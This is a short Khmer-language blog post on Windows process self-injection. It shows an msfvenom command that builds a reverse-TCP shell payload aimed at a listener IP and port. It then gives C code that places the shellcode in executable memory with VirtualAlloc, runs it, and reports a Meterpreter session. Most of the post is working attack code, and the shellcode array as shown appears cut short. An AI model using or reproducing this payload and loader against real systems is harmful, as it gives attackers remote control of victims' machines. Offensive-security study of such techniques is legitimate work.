---
title: "Process Injection - Self Injection Method"
date: 2023-06-20T21:01:06+07:00
description: ចាក់បញ្ជូល Shellcode ក្នុង Process ដោយប្រើវិធីសាស្ត្រ Self Injection
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
categories:
- Process Injection
series:
- WinExE
image: images/feature3/terminal.gif
---

#### Self-Injection Payload

ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។

{{< highlight bash "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c
{{< / highlight >}}

បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។

{{< highlight cpp "linenos=table" >}}
#include <stdio.h>
#include <Windows.h>

int main()
{
    unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0;
}
{{< / highlight >}}

ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ [Embarcadero Dev-C++](https://github.com/Embarcadero/Dev-Cpp/releases) ដើម្បីដំណើរការបង្កើត ។

ដោយសាកល្បងដំណើរការ Payload នេះយើងនឹងទទួលបាន Meterpreter ដូចដែលយើងរំពឹងទុក ។
![Meterpreter](/en/posts/img/2023/06/self-injection-method/meterpreter.png)
![Self Injection](/en/posts/img/2023/06/self-injection-method/self-injection.png)